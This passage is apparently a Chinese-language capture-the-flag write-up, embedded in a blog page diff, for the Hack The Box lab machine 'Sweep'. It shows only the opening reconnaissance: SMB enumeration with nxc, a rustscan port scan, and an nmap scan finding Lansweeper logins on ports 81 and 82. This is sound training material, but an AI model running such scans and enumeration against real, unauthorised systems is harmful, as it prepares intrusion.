@@ -1,0 +1,1043 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="机器简介\r一台中等难度的dc，来自vulnhub，但是最近并入了htb，所以我乐意在闲暇时间玩一玩\n机器在开始前附带信息如下\n用户标志位于 C：\\ 中，而不是用户的主目录中。请记住，HTB 实验室阻止了到玩家 VPN 隧道 IP 的 TCP 端口 22 流量。 将变量脚本生成好，并且解析域名并配置krb5.conf\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ echo ip=10.129.203.20&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ . start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ nxc smb $ip --generate-hosts-file hostname SMB 10.129.203.20 445 INVENTORY [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domin:sweep.vl) (signing:True) (SMBv1:False) (Null Auth:True) ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ echo domain=sweep.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ echo FQDN=INVENTORY.sweep.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ cat start.sh ip=10.129.203.20 domain=sweep.vl FQDN=INVENTORY.sweep.vl ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ . start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ ping $ip PING 10.129.203.20 (10.129.203.20) 56(84) bytes of data. 64 bytes from 10.129.203.20: icmp_seq=1 ttl=127 time=237 ms 64 bytes from 10.129.203.20: icmp_seq=2 ttl=127 time=234 ms ^C --- 10.129.203.20 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1002ms rtt min/avg/max/mdev = 234.054/235.340/236.626/1.286 ms 初步打点\r┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ rustscan -a $ip .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- You miss 100% of the ports you don&#39;t scan. - RustScan [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.203.20:53 Open 10.129.203.20:81 Open 10.129.203.20:82 Open 10.129.203.20:88 Open 10.129.203.20:135 Open 10.129.203.20:139 Open 10.129.203.20:389 Open 10.129.203.20:445 Open 10.129.203.20:464 Open 10.129.203.20:593 Open 10.129.203.20:636 Open 10.129.203.20:3268 Open 10.129.203.20:3269 Open 10.129.203.20:3389 Open 10.129.203.20:5985 看样子是开了81，82的域控，详细扫描一下81，82\n">
+<title>sweep-wp</title>
+
+<link rel='canonical' href='http://localhost:1313/post/sweep-htb/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="sweep-wp">
+<meta property='og:description' content="机器简介\r一台中等难度的dc，来自vulnhub，但是最近并入了htb，所以我乐意在闲暇时间玩一玩\n机器在开始前附带信息如下\n用户标志位于 C：\\ 中，而不是用户的主目录中。请记住，HTB 实验室阻止了到玩家 VPN 隧道 IP 的 TCP 端口 22 流量。 将变量脚本生成好，并且解析域名并配置krb5.conf\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ echo ip=10.129.203.20&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ . start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ nxc smb $ip --generate-hosts-file hostname SMB 10.129.203.20 445 INVENTORY [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domin:sweep.vl) (signing:True) (SMBv1:False) (Null Auth:True) ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ echo domain=sweep.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ echo FQDN=INVENTORY.sweep.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ cat start.sh ip=10.129.203.20 domain=sweep.vl FQDN=INVENTORY.sweep.vl ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ . start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ ping $ip PING 10.129.203.20 (10.129.203.20) 56(84) bytes of data. 64 bytes from 10.129.203.20: icmp_seq=1 ttl=127 time=237 ms 64 bytes from 10.129.203.20: icmp_seq=2 ttl=127 time=234 ms ^C --- 10.129.203.20 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1002ms rtt min/avg/max/mdev = 234.054/235.340/236.626/1.286 ms 初步打点\r┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ rustscan -a $ip .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- You miss 100% of the ports you don&#39;t scan. - RustScan [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.203.20:53 Open 10.129.203.20:81 Open 10.129.203.20:82 Open 10.129.203.20:88 Open 10.129.203.20:135 Open 10.129.203.20:139 Open 10.129.203.20:389 Open 10.129.203.20:445 Open 10.129.203.20:464 Open 10.129.203.20:593 Open 10.129.203.20:636 Open 10.129.203.20:3268 Open 10.129.203.20:3269 Open 10.129.203.20:3389 Open 10.129.203.20:5985 看样子是开了81，82的域控，详细扫描一下81，82\n">
+<meta property='og:url' content='http://localhost:1313/post/sweep-htb/'>
+<meta property='og:site_name' content='wackymaker'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='靶机' /><meta property='article:tag' content='htb' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-08-27T23:00:26&#43;08:00'/><meta property='article:modified_time' content='2025-08-27T23:00:26&#43;08:00'/>
+<meta name="twitter:title" content="sweep-wp">
+<meta name="twitter:description" content="机器简介\r一台中等难度的dc，来自vulnhub，但是最近并入了htb，所以我乐意在闲暇时间玩一玩\n机器在开始前附带信息如下\n用户标志位于 C：\\ 中，而不是用户的主目录中。请记住，HTB 实验室阻止了到玩家 VPN 隧道 IP 的 TCP 端口 22 流量。 将变量脚本生成好，并且解析域名并配置krb5.conf\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ echo ip=10.129.203.20&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ . start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ nxc smb $ip --generate-hosts-file hostname SMB 10.129.203.20 445 INVENTORY [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domin:sweep.vl) (signing:True) (SMBv1:False) (Null Auth:True) ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ echo domain=sweep.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ echo FQDN=INVENTORY.sweep.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ cat start.sh ip=10.129.203.20 domain=sweep.vl FQDN=INVENTORY.sweep.vl ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ . start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ ping $ip PING 10.129.203.20 (10.129.203.20) 56(84) bytes of data. 64 bytes from 10.129.203.20: icmp_seq=1 ttl=127 time=237 ms 64 bytes from 10.129.203.20: icmp_seq=2 ttl=127 time=234 ms ^C --- 10.129.203.20 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1002ms rtt min/avg/max/mdev = 234.054/235.340/236.626/1.286 ms 初步打点\r┌──(wackymaker㉿kali)-[~/tmp/hackthebox/sweep] └─$ rustscan -a $ip .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- You miss 100% of the ports you don&#39;t scan. - RustScan [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.203.20:53 Open 10.129.203.20:81 Open 10.129.203.20:82 Open 10.129.203.20:88 Open 10.129.203.20:135 Open 10.129.203.20:139 Open 10.129.203.20:389 Open 10.129.203.20:445 Open 10.129.203.20:464 Open 10.129.203.20:593 Open 10.129.203.20:636 Open 10.129.203.20:3268 Open 10.129.203.20:3269 Open 10.129.203.20:3389 Open 10.129.203.20:5985 看样子是开了81，82的域控，详细扫描一下81，82\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_6baab66dae07af16.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">wackymaker</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/wackymaker'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#机器简介">机器简介</a></li>
+    <li><a href="#初步打点">初步打点</a></li>
+    <li><a href="#ssh蜜罐">ssh蜜罐</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E9%A2%98%E7%9B%AEwp/" >
+                题目wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/sweep-htb/">sweep-wp</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 27, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    10 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="机器简介">机器简介
+</h2><p>一台中等难度的dc，来自vulnhub，但是最近并入了htb，所以我乐意在闲暇时间玩一玩</p>
+<p>机器在开始前附带信息如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>用户标志位于 C：<span style="color:#ae81ff">\ </span>中，而不是用户的主目录中。请记住，HTB 实验室阻止了到玩家 VPN 隧道 IP 的 TCP 端口 <span style="color:#ae81ff">22</span> 流量。
+</span></span></code></pre></div><p>将变量脚本生成好，并且解析域名并配置krb5.conf</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo ip<span style="color:#f92672">=</span>10.129.203.20&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip --generate-hosts-file hostname
+</span></span><span style="display:flex;"><span>SMB         10.129.203.20   <span style="color:#ae81ff">445</span>    INVENTORY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:INVENTORY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:sweep.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo domain<span style="color:#f92672">=</span>sweep.vl&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo FQDN<span style="color:#f92672">=</span>INVENTORY.sweep.vl&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat start.sh 
+</span></span><span style="display:flex;"><span>ip<span style="color:#f92672">=</span>10.129.203.20
+</span></span><span style="display:flex;"><span>domain<span style="color:#f92672">=</span>sweep.vl
+</span></span><span style="display:flex;"><span>FQDN<span style="color:#f92672">=</span>INVENTORY.sweep.vl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ping $ip
+</span></span><span style="display:flex;"><span>PING 10.129.203.20 <span style="color:#f92672">(</span>10.129.203.20<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.129.203.20: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">237</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.129.203.20: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">234</span> ms
+</span></span><span style="display:flex;"><span>^C
+</span></span><span style="display:flex;"><span>--- 10.129.203.20 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> packets transmitted, <span style="color:#ae81ff">2</span> received, 0% packet loss, time 1002ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 234.054/235.340/236.626/1.286 ms
+</span></span></code></pre></div><h2 id="初步打点">初步打点
+</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ rustscan -a $ip
+</span></span><span style="display:flex;"><span>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span style="display:flex;"><span>| <span style="color:#f92672">{}</span>  <span style="color:#f92672">}</span>| <span style="color:#f92672">{</span> <span style="color:#f92672">}</span> |<span style="color:#f92672">{</span> <span style="color:#f92672">{</span>__ <span style="color:#f92672">{</span>_   _<span style="color:#f92672">}{</span> <span style="color:#f92672">{</span>__  /  ___<span style="color:#f92672">}</span> / <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\ </span>|  <span style="color:#e6db74">`</span>| |
+</span></span><span style="display:flex;"><span>| .-. <span style="color:#ae81ff">\|</span> <span style="color:#f92672">{</span>_<span style="color:#f92672">}</span> |.-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span> | |  .-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span><span style="color:#ae81ff">\ </span>    <span style="color:#f92672">}</span>/  /<span style="color:#ae81ff">\ </span> <span style="color:#ae81ff">\|</span> |<span style="color:#ae81ff">\ </span> |
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39; `-&#39;</span><span style="color:#e6db74">`</span>-----<span style="color:#e6db74">&#39;`----&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;  `----&#39;</span>  <span style="color:#e6db74">`</span>---<span style="color:#e6db74">&#39; `-&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;`-&#39;</span> <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Modern Day Port Scanner.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: http://discord.skerritt.blog         :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: https://github.com/RustScan/RustScan :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> --------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">You miss 100% of the ports you don&#39;</span>t scan. - RustScan
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> The config file is expected to be at <span style="color:#e6db74">&#34;/home/wackymaker/.rustscan.toml&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Your file limit is very small, which negatively impacts RustScan<span style="color:#e6db74">&#39;s speed. Use the Docker image, or up the Ulimit with &#39;</span>--ulimit 5000<span style="color:#960050;background-color:#1e0010">&#39;</span>. 
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:53
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:81
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:82
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:88
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:135
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:139
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:389
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:445
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:464
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:593
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:636
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:3268
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:3269
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:3389
+</span></span><span style="display:flex;"><span>Open 10.129.203.20:5985
+</span></span></code></pre></div><p>看样子是开了81，82的域控，详细扫描一下81，82</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/sweep<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -p 81,82 -sC -sV --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span> $ip
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-08-27 09:39 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> INVENTORY.sweep.vl <span style="color:#f92672">(</span>10.129.203.20<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.24s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>81/tcp open  http     Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-title: Lansweeper - Login
+</span></span><span style="display:flex;"><span>|_Requested resource was /login.aspx
+</span></span><span style="display:flex;"><span>82/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>| http-title: Lansweeper - Login
+</span></span><span style="display:flex;"><span>|_Requested resource was /login.aspx
